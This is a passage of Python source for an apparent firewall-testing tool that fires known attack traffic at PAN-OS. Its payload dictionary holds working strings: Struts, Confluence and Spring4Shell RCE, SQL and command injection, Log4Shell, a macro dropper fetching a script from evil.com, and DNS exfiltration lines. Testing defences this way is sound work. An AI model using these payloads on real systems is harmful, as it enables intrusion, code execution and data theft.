DATA_EXFILTRATION_TESTS = [
    SecurityTestCase('exfil_credit_card', 'Credit Card Number Exfiltration',
        'data_exfiltration', 'POSTs multiple Luhn-valid credit card numbers (Visa, Mastercard, Amex) to an external server. Data Filtering profile should detect credit card patterns and block the exfiltration.',
        'block', 'Data Filtering', threat_id='Data Filtering: Credit Card Numbers'),
    SecurityTestCase('exfil_ssn', 'Social Security Number Exfiltration',
        'data_exfiltration', 'POSTs Social Security Numbers in XXX-XX-XXXX format to an external server. Data Filtering profile should detect SSN patterns and block the data leak.',
        'block', 'Data Filtering', threat_id='Data Filtering: SSN'),
    SecurityTestCase('exfil_bulk_data', 'Bulk PII Data Exfiltration',
        'data_exfiltration', 'POSTs a large payload containing mixed PII — credit cards, SSNs, email addresses, phone numbers. Tests Data Filtering detection threshold for bulk sensitive data.',
        'block', 'Data Filtering', threat_id='Data Filtering: Bulk PII'),
    SecurityTestCase('exfil_dns_data', 'DNS-Based Data Exfiltration',
        'data_exfiltration', 'Encodes sensitive data as hex in DNS subdomain queries (e.g., 4111111111111111.exfil.attacker.com). Anti-Spyware should detect DNS exfiltration patterns.',
        'block', 'Anti-Spyware', threat_id='86600 — DNS Data Exfiltration'),
    SecurityTestCase('exfil_http_headers', 'Header-Based Data Exfiltration',
        'data_exfiltration', 'Hides sensitive data (credit cards, SSNs) in custom HTTP headers (X-Session-Data, X-Debug-Info). Tests whether Data Filtering inspects headers, not just body.',
        'block', 'Data Filtering', threat_id='Data Filtering: Header Exfil'),
]

EVASION_TECHNIQUE_TESTS = [
    SecurityTestCase('evasion_double_encode', 'Double URL Encoding Evasion',
        'evasion_techniques', 'SQL injection payload with double URL encoding (%2527 instead of %27). Tests whether the firewall performs recursive URL decoding before signature matching.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Double Encoded)'),
    SecurityTestCase('evasion_null_byte', 'Null Byte Injection Evasion',
        'evasion_techniques', 'Path traversal with null byte (%00) appended to bypass file extension checks (../../etc/passwd%00.jpg). Tests null byte handling in the IPS engine.',
        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal (Null Byte)'),
    SecurityTestCase('evasion_chunked', 'Chunked Transfer Encoding Evasion',
        'evasion_techniques', 'SQL injection payload split across multiple HTTP chunks using Transfer-Encoding: chunked. Tests whether the firewall reassembles chunks before inspection.',
        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Evasion (Chunked)'),
    SecurityTestCase('evasion_unicode', 'Unicode Escape Evasion',
        'evasion_techniques', 'XSS payload using Unicode escape sequences (\\u003cscript\\u003e instead of <script>). Tests Unicode normalization in the IPS engine.',
        'block', 'Vulnerability Protection', threat_id='41501 — XSS (Unicode Encoded)'),
    SecurityTestCase('evasion_case_mixing', 'Case Randomization Evasion',
        'evasion_techniques', 'SQL injection with randomized character case (SeLeCt, UnIoN). Tests case-insensitive signature matching in Vulnerability Protection.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Case Mixed)'),
    SecurityTestCase('evasion_comment_insert', 'SQL Comment Insertion Evasion',
        'evasion_techniques', 'SQL injection with inline comments between keywords (UN/**/ION SE/**/LECT). Tests whether the firewall strips SQL comments before matching.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Comment Insertion)'),
]

C2_EXPANDED_TESTS = [
    SecurityTestCase('c2_cobalt_strike', 'Cobalt Strike Beacon',
        'malware_threats', 'Simulates Cobalt Strike malleable C2 beacon callback with characteristic URI pattern (/submit.php), MSIE User-Agent, and base64-encoded session cookie.',
        'block', 'Anti-Spyware', threat_id='86502 — Cobalt Strike C2 Beacon'),
    SecurityTestCase('c2_metasploit', 'Metasploit Reverse HTTP',
        'malware_threats', 'Simulates Metasploit reverse HTTP handler with short randomized URI path, Trident User-Agent, and binary POST payload (PE-like header).',
        'block', 'Anti-Spyware', threat_id='86503 — Metasploit Reverse HTTP'),
    SecurityTestCase('c2_dns_c2', 'DNS C2 Channel',
        'malware_threats', 'Sends DNS TXT queries with encoded C2 data in subdomain labels, simulating tools like dnscat2 or Cobalt Strike DNS beacon.',
        'block', 'Anti-Spyware', threat_id='86504 — DNS C2 Communication'),
    SecurityTestCase('c2_icmp_tunnel', 'ICMP Data Tunnel',
        'malware_threats', 'Sends ICMP echo requests with encoded data payloads using hping3, simulating ICMP-based tunneling tools like icmpsh or ptunnel.',
        'block', 'Anti-Spyware', threat_id='86505 — ICMP Tunnel'),
    SecurityTestCase('c2_http_beacon', 'HTTP Beacon with Jitter',
        'malware_threats', 'Sends periodic HTTP POST callbacks with rotating User-Agents, encoded payloads, and beacon sequence headers, simulating C2 framework behavior.',
        'block', 'Anti-Spyware', threat_id='86506 — HTTP C2 Beacon'),
]

CREDENTIAL_PHISHING_TESTS = [
    SecurityTestCase('phish_http_login', 'HTTP Credential Submission',
        'credential_phishing', 'Submits test corporate credentials (username/password) to an HTTP login form. PAN-OS Credential Phishing Prevention should detect and block credential submission to untrusted sites.',
        'block', 'Credential Phishing Prevention'),
    SecurityTestCase('phish_https_login', 'HTTPS Credential Submission',
        'credential_phishing', 'Submits test credentials to an HTTPS login form. Requires SSL Decryption to inspect the encrypted POST body. Tests credential phishing prevention with decryption enabled.',
        'block', 'Credential Phishing Prevention + SSL Decryption'),
    SecurityTestCase('phish_js_exfil', 'JS-Based Credential Theft',
        'credential_phishing', 'Simulates JavaScript keylogger exfiltration — sends credentials in URL query parameters via GET request. Tests detection of credential data in URLs.',
        'block', 'URL Filtering + Credential Phishing Prevention'),
    SecurityTestCase('phish_hidden_form', 'Hidden Form Credential Harvest',
        'credential_phishing', 'Submits credentials via a phishing kit-style form with hidden fields (CSRF token, redirect to external collection domain). Tests detection of suspicious credential harvesting patterns.',
        'block', 'Credential Phishing Prevention'),
]

ENCRYPTED_DNS_TESTS = [
    SecurityTestCase('doh_google', 'DNS-over-HTTPS (Google)',
        'encrypted_dns', 'Sends a DNS query over HTTPS to Google DNS (dns.google) using the JSON API. Firewall App-ID should identify and control DoH traffic to prevent DNS policy bypass.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('doh_cloudflare', 'DNS-over-HTTPS (Cloudflare)',
        'encrypted_dns', 'Sends a DNS query over HTTPS to Cloudflare DNS (cloudflare-dns.com). Tests whether the firewall detects and blocks DoH traffic to alternative DNS providers.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('doh_exfil', 'Data Exfiltration via DoH',
        'encrypted_dns', 'Sends hex-encoded sensitive data as DNS subdomain labels via DoH query. Tests whether the firewall can detect data exfiltration over encrypted DNS channels.',
        'block', 'DNS Security + Anti-Spyware', threat_id='App-ID: dns-over-https'),
    SecurityTestCase('dot_query', 'DNS-over-TLS Query',
        'encrypted_dns', 'Initiates a DNS-over-TLS connection to Google DNS on port 853. Firewall App-ID should identify DoT traffic and enforce DNS policies.',
        'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-tls'),
]

SPYWARE_PHONEHOME_TESTS = [
    SecurityTestCase('spy_gh0st', 'Gh0st RAT Callback',
        'spyware_phonehome', 'Simulates Gh0st RAT phone-home with characteristic User-Agent string and magic bytes. PAN-OS Anti-Spyware has dedicated signatures for Gh0st variants.',
        'block', 'Anti-Spyware', threat_id='13001 — Gh0st RAT'),
    SecurityTestCase('spy_njrat', 'njRAT Phone-Home',
        'spyware_phonehome', 'Simulates njRAT/Bladabindi trojan callback with characteristic User-Agent and connection pattern. One of the most common RATs detected by PAN-OS.',
        'block', 'Anti-Spyware', threat_id='13047 — njRAT'),
    SecurityTestCase('spy_darkcomet', 'DarkComet Beacon',
        'spyware_phonehome', 'Simulates DarkComet RAT beacon with pipe-delimited DCDATA format. Tests Anti-Spyware detection of known RAT communication patterns.',
        'block', 'Anti-Spyware', threat_id='13026 — DarkComet RAT'),
    SecurityTestCase('spy_emotet', 'Emotet C2 Check-in',
        'spyware_phonehome', 'Simulates Emotet trojan check-in POST with binary-encoded payload and MSIE User-Agent. Emotet is a major threat family tracked by PAN-OS.',
        'block', 'Anti-Spyware', threat_id='86507 — Emotet C2'),
]

CVE_EXPLOIT_TESTS = [
    SecurityTestCase('cve_spring4shell', 'Spring4Shell (CVE-2022-22965)',
        'cve_exploits', 'Sends Spring4Shell exploit payload — class.module.classLoader property chain targeting Spring Framework for RCE. PAN-OS Threat ID 92633.',
        'block', 'Vulnerability Protection', threat_id='92633 — Spring4Shell'),
    SecurityTestCase('cve_apache_struts', 'Apache Struts RCE (CVE-2017-5638)',
        'cve_exploits', 'Sends OGNL expression in Content-Type header targeting Apache Struts for RCE. One of the most exploited CVEs in the wild. PAN-OS Threat ID 38705.',
        'block', 'Vulnerability Protection', threat_id='38705 — Apache Struts RCE'),
    SecurityTestCase('cve_proxyshell', 'ProxyShell (CVE-2021-34473)',
        'cve_exploits', 'Sends Exchange Server autodiscover path traversal with email prefix for SSRF. ProxyShell was widely exploited in 2021. PAN-OS Threat ID 91609.',
        'block', 'Vulnerability Protection', threat_id='91609 — ProxyShell'),
    SecurityTestCase('cve_moveit', 'MOVEit SQLi (CVE-2023-34362)',
        'cve_exploits', 'Sends SQL injection via X-siLock-Transaction header targeting MOVEit Transfer. Exploited by Cl0p ransomware group in 2023. PAN-OS Threat ID 93246.',
        'block', 'Vulnerability Protection', threat_id='93246 — MOVEit SQLi'),
    SecurityTestCase('cve_confluence', 'Confluence OGNL (CVE-2022-26134)',
        'cve_exploits', 'Sends OGNL expression in URI targeting Confluence Server for unauthenticated RCE. PAN-OS Threat ID 92632.',
        'block', 'Vulnerability Protection', threat_id='92632 — Confluence OGNL'),
]

BRUTE_FORCE_TESTS = [
    SecurityTestCase('bf_http_login', 'HTTP Login Brute Force',
        'brute_force', 'Sends 10 rapid sequential login attempts with different passwords to trigger brute-force detection. Firewall should rate-limit or block after threshold.',
        'block', 'Vulnerability Protection / Zone Protection'),
    SecurityTestCase('bf_basic_auth', 'HTTP Basic Auth Brute Force',
        'brute_force', 'Sends 10 rapid HTTP requests with different Basic Auth credentials. Tests firewall detection of credential brute-force via Authorization header.',
        'block', 'Vulnerability Protection / Zone Protection'),
    SecurityTestCase('bf_password_spray', 'Password Spray Attack',
        'brute_force', 'Sends 10 rapid login attempts with same password but different usernames. Tests firewall detection of password spray technique.',
        'block', 'Vulnerability Protection / Zone Protection'),
]

FILE_BLOCKING_TESTS = [
    SecurityTestCase('fb_bat', 'BAT Script Download',
        'file_blocking', 'Downloads a BAT script file. Firewall File Blocking profile should detect the file type and block the download based on policy.',
        'block', 'File Blocking'),
    SecurityTestCase('fb_ps1', 'PowerShell Script Download',
        'file_blocking', 'Downloads a PowerShell (.ps1) script. Firewall File Blocking should block PowerShell file downloads — a primary malware delivery vector.',
        'block', 'File Blocking'),
    SecurityTestCase('fb_hta', 'HTA Application Download',
        'file_blocking', 'Downloads an HTA (HTML Application) file. Firewall File Blocking should block HTA downloads — HTA files execute with full system privileges.',
        'block', 'File Blocking'),
    SecurityTestCase('fb_jar', 'Java Archive Download',
        'file_blocking', 'Downloads a JAR (Java Archive) file. Firewall File Blocking should block JAR downloads — commonly used for exploit delivery.',
        'block', 'File Blocking'),
]

WILDFIRE_TESTS = [
    SecurityTestCase('wf_novel_pe', 'Novel PE with Suspicious Imports',
        'wildfire_analysis', 'Downloads a novel PE executable with suspicious Windows API imports (VirtualAllocEx, CreateRemoteThread). Should trigger WildFire sandbox submission.',
        'block', 'WildFire'),
    SecurityTestCase('wf_macro_dropper', 'Macro Document Dropper',
        'wildfire_analysis', 'Sends an OLE2 document with macro containing PowerShell download cradle. Should trigger WildFire analysis or Anti-Virus detection.',
        'block', 'WildFire'),
    SecurityTestCase('wf_script_obfuscated', 'Obfuscated Script Download',
        'wildfire_analysis', 'Downloads a VBScript file using Chr() concatenation obfuscation to evade static signatures. Should trigger WildFire dynamic analysis.',
        'block', 'WildFire'),
]

CRYPTOMINING_TESTS = [
    SecurityTestCase('crypto_coinhive', 'Coinhive Mining Script',
        'cryptomining', 'Sends HTTP request with Coinhive mining script URI pattern and WebSocket upgrade headers. PAN-OS Anti-Spyware should detect cryptocurrency mining activity.',
        'block', 'Anti-Spyware', threat_id='86600 — Coinhive Miner'),
    SecurityTestCase('crypto_stratum', 'Stratum Mining Protocol',
        'cryptomining', 'Sends Stratum mining protocol JSON-RPC with mining.subscribe method and XMRig miner identification. PAN-OS should detect mining pool communication.',
        'block', 'Anti-Spyware', threat_id='86601 — Stratum Mining'),
    SecurityTestCase('crypto_pool_url', 'Mining Pool URL Access',
        'cryptomining', 'Accesses known cryptocurrency mining pool domain (minergate.com). PAN-OS URL Filtering should categorize and block mining pool domains.',
        'block', 'URL Filtering / Anti-Spyware'),
]

RANSOMWARE_TESTS = [
    SecurityTestCase('ransom_note', 'Ransomware Note Delivery',
        'ransomware', 'Sends ransomware note content with Bitcoin wallet address, payment instructions, and file encryption notice. PAN-OS should detect ransomware indicators.',
        'block', 'Anti-Spyware / Data Filtering'),
    SecurityTestCase('ransom_c2_tor', 'Ransomware Tor C2',
        'ransomware', 'Sends HTTP request with .onion domain in Host header and TOR User-Agent. PAN-OS should detect ransomware Tor-based C2 communication.',
        'block', 'Anti-Spyware / URL Filtering'),
    SecurityTestCase('ransom_wannacry', 'WannaCry Kill Switch',
        'ransomware', 'Accesses WannaCry ransomware kill-switch domain pattern. PAN-OS Anti-Spyware should detect this characteristic WannaCry network indicator.',
        'block', 'Anti-Spyware', threat_id='86510 — WannaCry Ransomware'),
]

ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + C2_EXPANDED_TESTS +
             URL_FILTERING_TESTS + DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS +
             FILE_THREAT_TESTS + SSL_DECRYPTION_TESTS + APPID_VALIDATION_TESTS +
             DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS +
             CREDENTIAL_PHISHING_TESTS + ENCRYPTED_DNS_TESTS +
             SPYWARE_PHONEHOME_TESTS + CVE_EXPLOIT_TESTS + BRUTE_FORCE_TESTS +
             FILE_BLOCKING_TESTS + WILDFIRE_TESTS + CRYPTOMINING_TESTS +
             RANSOMWARE_TESTS)
TEST_MAP = {t.id: t for t in ALL_TESTS}

# Default URL Filtering test URLs (configurable at runtime)
DEFAULT_URL_MAP = {
    'url_malware': 'http://urlfiltering.paloaltonetworks.com/test-malware',
    'url_phishing': 'http://urlfiltering.paloaltonetworks.com/test-phishing',
    'url_hacking': 'http://urlfiltering.paloaltonetworks.com/test-hacking',
    'url_proxy': 'http://urlfiltering.paloaltonetworks.com/test-proxy-avoidance-and-anonymizers',
}

# PAN-OS block page markers (HTML response contains these when blocked)
BLOCK_PAGE_MARKERS = [
    'Palo Alto Networks',
    'block page',
    'URL Filtering',
    'Threat Prevention',
    'has been blocked',
    'Web Page Blocked',
    'Access to this website',
    'Security policy',
    'This page has been blocked',
    'request was blocked',
    'blocked by security',
    'threat detected',
    'action="reset-both"',
    'action="reset-server"',
    'action="reset-client"',
    'action="drop"',
]

# ─── Attack Payloads ────────────────────────────────────────

ATTACK_PAYLOADS = {
    'sqli_union': "' UNION SELECT username,password FROM users--",
    'sqli_or': "' OR '1'='1' --",
    'sqli_drop': "'; DROP TABLE users;--",
    'xss_script': '<script>alert("XSS")</script>',
    'xss_img': '<img src=x onerror=alert("XSS")>',
    'xss_svg': '<svg onload=alert("XSS")>',
    'cmdi_cat': '; cat /etc/passwd',
    'cmdi_pipe': '| ls -la /',
    'cmdi_backtick': '`id`',
    'path_traversal': '../../../../etc/passwd',
    'log4shell': '${jndi:ldap://attacker.com/exploit}',
    # DNS Attacks — multiple queries per test for better detection
    'dns_tunnel': 'aW1wb3J0IG9zO29zLnN5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik.dnscat.attacker.example.com|Y2F0IC9ldGMvc2hhZG93IHwgYmFzZTY0IC1kID4gL3RtcC9vdXQ.t1.tunnel.example.com|c3lzdGVtaW5mbyB8IGJhc2U2NCAtdyAwID4gL3RtcC9zeXNpbmZv.t2.tunnel.example.com|bmV0c3RhdCAtdGxucCB8IGJhc2U2NA.data.tunnel.example.com|d2hvYW1pICYmIGhvc3RuYW1lICYmIGlkIC1h.exfil.tunnel.example.com',
    'dns_dga': 'xkqrtvwzmjfhglpnds.com|bvycxqwrtmjnhkgfdp.net|zlkxjwrmqnvghftdps.org|qwmxhrtknvgzfplds.biz|jfkdlsqpwmxzrvhng.info|plnhgfwxqzmkrtdvs.cc|rvtxwqzjmhkgpndfs.top',
    'dns_rebind': 'rebind-127-0-0-1.attacker.example.com',
    # Protocol Abuse
    'ssh_bruteforce': 'admin:password|root:toor|admin:admin123|root:root|test:test123',
    'ftp_bounce': 'PORT 192,168,1,1,0,80',
    'http_smuggle': 'Transfer-Encoding: chunked\r\nContent-Length: 42\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal',
    'slowloris': 'X-Slowloris-Header-{n}: keep-alive-{n}',
    # File-Based Threats
    'pdf_js': '/test-file/pdf-js',
    'office_macro': '/test-file/office-macro',
    'pe_download': '/test-file/pe',
    # Advanced Web Attacks
    'xxe': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
    'ssrf': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'ssti': '{{7*7}}${7*7}<%= 7*7 %>${{constructor.constructor("return this")()}}',
    'ldap_injection': '*)(&(objectClass=*))(uid=*))(|(uid=*',
    'xpath_injection': "' or '1'='1' or ''='",
    'crlf_injection': '%0d%0aSet-Cookie:%20malicious=true%0d%0aX-Injected:%20header',
    'open_redirect': 'https://evil.example.com/phishing',
    'blind_sqli': "' AND SLEEP(5)-- -",
    'deserialization': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXQACGNhbGMuZXhl',
    'shellshock': '() { :;}; /bin/cat /etc/passwd',
    'file_inclusion': 'http://evil.example.com/shell.txt%00',
    'info_disclosure': 'phpinfo.php|.env|.git/config|wp-config.php.bak|server-status',
    # SSL Decryption — reuse same payloads, sent over HTTPS
    'ssl_sqli': "' UNION SELECT username,password FROM users--",
    'ssl_xss': '<script>alert("XSS")</script>',
    'ssl_eicar': '/eicar',
    'ssl_c2': 'eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0NTY3ODkwIn0=',
    'ssl_cmdi': '; cat /etc/passwd',
    # App-ID Validation — protocol identification strings
    'appid_ssh_on_443': 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n',
    'appid_http_on_8080': 'GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n',
    'appid_ftp_on_443': 'USER anonymous\r\n',
    'appid_dns_on_80': 'dns-a-query:example.com',
    # Data Exfiltration — sensitive data patterns
    'exfil_credit_card': 'Transaction ID: TXN-29571\nCard: 4111111111111111\nCard: 5500000000000004\nCard: 340000000000009\nCard: 6011000000000004\nAmount: $4,299.00\nStatus: approved',
    'exfil_ssn': 'Employee Records Export\nJohn Smith, SSN: 123-45-6789, DOB: 1985-03-15\nJane Doe, SSN: 987-65-4321, DOB: 1990-07-22\nBob Wilson, SSN: 456-78-9012, DOB: 1978-11-30',
    'exfil_bulk_data': 'CONFIDENTIAL - Employee Data Dump\nCC: 4111111111111111, SSN: 123-45-6789, email: admin@corp.com, phone: 555-0100\nCC: 5500000000000004, SSN: 987-65-4321, email: cfo@corp.com, phone: 555-0101\nCC: 340000000000009, SSN: 456-78-9012, email: hr@corp.com, phone: 555-0102\nCC: 6011000000000004, SSN: 111-22-3333, email: ceo@corp.com, phone: 555-0103',
    'exfil_dns_data': '34313131313131313131313131.exfil.attacker.example.com|353530303030303030303030.leak.attacker.example.com|3132332d34352d36373839.data.attacker.example.com',
    'exfil_http_headers': '4111111111111111|123-45-6789|admin@corp.com',
    # Evasion Techniques — encoded/obfuscated attack payloads
    'evasion_double_encode': '%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--',
    'evasion_null_byte': '../../../../etc/passwd%00.jpg',
    'evasion_chunked': "' UNION SELECT username,password FROM users--",
    'evasion_unicode': '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
    'evasion_case_mixing': "' uNiOn SeLeCt username,password FrOm users--",
    'evasion_comment_insert': "' UN/**/ION SEL/**/ECT username,password FR/**/OM users--",
    # Expanded C2
    'c2_cobalt_strike': '/submit.php?id=1234567890',
    'c2_metasploit': '/4hRs',
    'c2_dns_c2': 'Y21kPXdob2FtaQ.c2.attacker.example.com|aWQ9YWRtaW4.beacon.attacker.example.com|c3RhdHVzPWFsaXZl.check.attacker.example.com',
    'c2_icmp_tunnel': 'ICMP-TUNNEL-DATA:Y21kPXdob2FtaSAmJiBob3N0bmFtZSAmJiBpZA==',
    'c2_http_beacon': 'eyJiZWFjb24iOiJ0cnVlIiwic2xlZXAiOjYwLCJqaXR0ZXIiOjEwfQ==',
    # Credential Phishing
    'phish_http_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
    'phish_https_login': 'username=admin@acmecorp.com&password=P@ssw0rd123!',
    'phish_js_exfil': 'u=admin@acmecorp.com&p=P@ssw0rd123!&action=keylog&src=formgrabber',
    'phish_hidden_form': 'username=admin@acmecorp.com&password=P@ssw0rd123!&csrf_token=abc123def456&redirect_url=http://evil.example.com/collect&org=AcmeCorp',
    # Encrypted DNS
    'doh_google': 'malware.testcategory.com',
    'doh_cloudflare': 'phishing.testcategory.com',
    'doh_exfil': '4111111111111111.exfil.testdomain.com',
    'dot_query': 'hacking.testcategory.com',
    # Spyware Phone-Home
    'spy_gh0st': 'Gh0st\xab\xcd\x00\x00\x00\x00\x00\x00',
    'spy_njrat': 'njconnect|0.7d|PC-USER|Windows 10|No|0.7d|..',
    'spy_darkcomet': 'DCDATA|GetSIN|USER-PC|admin|Windows 10 Pro|0|0|',
    'spy_emotet': 'eyJib3QiOiJlbW90ZXQiLCJ2ZXIiOiIxLjAiLCJvcyI6IldpbjEwIiwidWlkIjoiMTIzNDU2Nzg5MCJ9',
    # CVE Exploits
    'cve_spring4shell': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
    'cve_apache_struts': '%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd","/c",#cmd}:{"/bin/sh","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}',
    'cve_proxyshell': '/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com',
    'cve_moveit': "0; UPDATE UserPermissions SET Permission=31 WHERE Username='svc_moveit'--",
    'cve_confluence': '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}',
    # Brute Force
    'bf_http_login': 'password1|Password1!|admin123|letmein|welcome1|pass1234|qwerty123|abc12345|monkey1!|dragon99',
    'bf_basic_auth': 'admin:password|admin:admin123|admin:letmein|admin:welcome|root:toor|root:root123|user:user123|test:test123|admin:qwerty|admin:password1',
    'bf_password_spray': 'user1:Spring2024!|user2:Spring2024!|user3:Spring2024!|user4:Spring2024!|user5:Spring2024!|admin:Spring2024!|svc_account:Spring2024!|backup:Spring2024!|monitor:Spring2024!|operator:Spring2024!',
    # File Blocking
    'fb_bat': '/test-file/script?type=bat',
    'fb_ps1': '/test-file/script?type=ps1',
    'fb_hta': '/test-file/hta',
    'fb_jar': '/test-file/jar',
    # WildFire Analysis
    'wf_novel_pe': '/test-file/wildfire-pe',
    'wf_macro_dropper': 'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n  Dim ps As String\r\n  ps = "powershell -nop -w hidden -enc " & Base64Encode("IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')")\r\n  Shell ps, vbHide\r\nEnd Sub',
    'wf_script_obfuscated': '/test-file/script?type=vbs',
    # Cryptomining
    'crypto_coinhive': '/lib/coinhive.min.js',
    'crypto_stratum': '{"id":1,"method":"mining.subscribe","params":["xmrig/6.18.0","x"]}',
    'crypto_pool_url': 'pool.minergate.com',
    # Ransomware
    'ransom_note': 'YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your documents, photos, databases and other important files have been encrypted.\nYou will not be able to recover them without our decryption service.\n\nTo decrypt your files, send 0.5 BTC to:\n  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nAfter payment, email proof to: decrypt@protonmail.com\nYou have 72 hours before the price doubles.\n\nDO NOT attempt to decrypt files yourself — they will be permanently damaged.',
    'ransom_c2_tor': 'http://k5zq47j6wd3wdvjq.onion/gate.php',
    'ransom_wannacry': 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com',
}

# ─── Custom Pattern Store ──────────────────────────────────

class CustomPatternStore:
    """Persistent storage for user-defined attack patterns."""

    def __init__(self, path=None):
        if path is None:
            # Prefer /data if writable, else /tmp
            if os.path.isdir('/data') and os.access('/data', os.W_OK):
                path = '/data/custom_patterns.json'
            else:
                path = '/tmp/custom_patterns.json'
        self._path = path
        self._lock = threading.Lock()
        self._patterns: List[dict] = []
        self._load()

    def _load(self):
        try:
            with open(self._path) as f:
                self._patterns = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._patterns = []

    def _save(self):
        with open(self._path, 'w') as f:
            json.dump(self._patterns, f, indent=2)

    def list(self) -> List[dict]:
        with self._lock:
            return list(self._patterns)

    def add(self, pattern: dict) -> dict:
        with self._lock:
            pattern['id'] = 'custom_' + uuid.uuid4().hex[:8]
            self._patterns.append(pattern)
            self._save()
            return pattern

    def update(self, pattern_id: str, updates: dict) -> Optional[dict]:
        with self._lock:
            for p in self._patterns:
                if p['id'] == pattern_id:
                    p.update(updates)
                    p['id'] = pattern_id  # Prevent id overwrite
                    self._save()
                    return p
            return None

    def delete(self, pattern_id: str) -> bool:
        with self._lock:
            before = len(self._patterns)
            self._patterns = [p for p in self._patterns if p['id'] != pattern_id]
            if len(self._patterns) < before:
                self._save()
                return True
            return False

    def to_test_cases(self) -> List[SecurityTestCase]:
        cases = []
        with self._lock:
            for p in self._patterns:
                cases.append(SecurityTestCase(
                    id=p['id'],
                    name=p.get('name', 'Custom Test'),
                    category=p.get('category', 'web_attacks'),
                    description=p.get('description', ''),
                    expected_action=p.get('expected_action', 'block'),
                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
                    custom=True,
                    payload=p.get('payload', ''),
                    method=p.get('method', 'GET'),
                    headers=p.get('headers', {}),
                    target_path=p.get('target_path', '/echo'),
                ))
        return cases


# ─── Raw HTTP Helper ───────────────────────────────────────

class _RawResponse:
    """Minimal response object compatible with _analyze_response / _resp_snippet."""
    def __init__(self, status_code: int, text: str, headers: dict):
        self.status_code = status_code
        self.text = text
        self.content = text.encode('utf-8', errors='replace')
        self.headers = headers


def _raw_http_get(host: str, port: int, path_and_query: str,
                  extra_headers: dict = None, timeout: int = 10) -> _RawResponse:
    """Send HTTP GET via raw socket — NO automatic URL encoding.

    This ensures attack characters like < > ' " ; | reach the firewall
    exactly as-is on the wire, maximising IPS signature match probability.
    Only spaces are replaced with %20 so the HTTP request line stays parseable.
    Raises OSError / socket.timeout on connection failure (same as requests).
    """
    safe_path = path_and_query.replace(' ', '%20')
    hdrs = {
        'Host': f'{host}:{port}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vortex/1.0',
        'Accept': '*/*',
        'Connection': 'close',
    }
    if extra_headers:
        hdrs.update(extra_headers)
    header_lines = ''.join(f'{k}: {v}\r\n' for k, v in hdrs.items())
    request = f'GET {safe_path} HTTP/1.1\r\n{header_lines}\r\n'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    s.sendall(request.encode('utf-8', errors='replace'))

    resp_data = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp_data += chunk
        except socket.timeout:
            break
    s.close()

    resp_str = resp_data.decode('utf-8', errors='replace')

    # Parse status code
    status_code = 0
    if resp_str.startswith('HTTP/'):
        try:
            status_code = int(resp_str.split(' ', 2)[1])
        except (IndexError, ValueError):
            pass

    # Split headers / body
    body = ''
    resp_headers = {}
    if '\r\n\r\n' in resp_str:
        head, body = resp_str.split('\r\n\r\n', 1)
        for line in head.split('\r\n')[1:]:   # skip status line
            if ':' in line:
                k, v = line.split(':', 1)
                resp_headers[k.strip()] = v.strip()

    return _RawResponse(status_code, body, resp_headers)


# ─── Response Helpers ──────────────────────────────────────

def _resp_snippet(resp) -> str:
    """Get first 500 chars of response body safely."""
    try:
        text = resp.text or ''
